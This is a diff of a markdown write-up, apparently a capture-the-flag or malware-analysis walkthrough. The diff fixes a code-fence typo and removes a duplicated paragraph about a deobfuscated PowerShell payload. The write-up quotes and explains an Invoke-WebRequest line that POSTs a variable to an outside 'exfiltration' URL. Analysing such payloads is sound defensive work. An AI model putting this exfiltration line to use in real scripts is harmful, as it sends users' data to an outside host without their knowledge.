@@ -13,20 +13,11 @@ After we deobfuscated the first stage of the payload, we stumbled across this po
 
 At the second-last line, you can see the following piece of powershell code:
 
-````ps
+```ps
 Invoke-Webrequest -Method Post -Uri "https://www.thepowershellhacker.com/exfiltration" -Body $body
 ```
 
 ---
-
-After we deobfuscated the first stage of the payload, we stumbled across this powershell code:
-![](PowershellCode.png)
-
-At the second-last line, you can see the following piece of powershell code:
-
-```ps
-Invoke-Webrequest -Method Post -Uri "https://www.thepowershellhacker.com/exfiltration" -Body $body
-````
 
 This line sends a variable called `body` to `www.thepowershellhacker.com/exfiltration` in a post request.
 
